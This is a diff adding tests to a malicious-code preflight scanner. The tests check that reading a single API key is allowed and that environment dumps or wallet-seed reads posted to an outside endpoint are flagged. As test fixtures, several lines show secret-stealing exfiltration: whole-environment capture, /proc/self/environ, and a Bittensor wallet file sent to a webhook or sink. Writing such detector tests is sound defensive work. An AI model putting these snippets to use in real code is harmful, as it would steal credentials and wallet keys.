@@ -760,6 +760,59 @@ def test_decisive_malicious_preflight_categories(
     assert expected_category in {item["category"] for item in findings}
 
 
+def test_decisive_preflight_allows_a_targeted_api_key_read_beside_a_post() -> None:
+    """One named key plus an outbound call is an API client, not a leak.
+
+    Reproduces white-bolt v2 (artifact 55e3d522) and Omar-miner_v9, both
+    quarantined at confidence 1.0 for a dev script that reads the provider key
+    it is about to authenticate with. The key never leaves the provider that
+    issued it, so there is nothing exfiltrated.
+    """
+    findings = find_decisive_malicious_source(
+        [
+            (
+                "scripts/system-transport-probe.py",
+                'api_key = os.environ.get("OPENROUTER_API_KEY", "").strip()\n'
+                "results = post_completion(base_url=base_url, api_key=api_key)\n",
+            ),
+            (
+                "src/runtime.rs",
+                'let key = std::env::var("OPENROUTER_API_KEY").unwrap_or_default();\n'
+                "let response = http_client.post(url).bearer_auth(key).send();\n",
+            ),
+        ]
+    )
+    assert findings == []
+
+
+def test_decisive_preflight_still_flags_whole_environment_capture() -> None:
+    """Enumerating the environment beside an outbound call stays decisive."""
+    for source in (
+        "payload = dict(os.environ)\nrequests.post(webhook, json=payload)",
+        "for name in os.environ:\n    upload(name)",
+        "let all = std::env::vars().collect();\nreqwest::Client::new().post(sink);",
+        'let raw = read("/proc/self/environ");\nhttp_client.post(callback, raw);',
+    ):
+        findings = find_decisive_malicious_source([("src/runtime.rs", source)])
+        assert "data_exfiltration" in {
+            item["category"] for item in findings
+        }, source
+
+
+def test_decisive_preflight_still_flags_targeted_wallet_reads() -> None:
+    """A named lookup is only forgiven for the environment, not for wallets."""
+    findings = find_decisive_malicious_source(
+        [
+            (
+                "src/runtime.rs",
+                'let seed = read(".bittensor/wallets/default");\n'
+                "http_client.post(sink, seed);",
+            )
+        ]
+    )
+    assert "data_exfiltration" in {item["category"] for item in findings}
+
+
 def test_decisive_malicious_preflight_ignores_inert_regression_material() -> None:
     findings = find_decisive_malicious_source(
         [
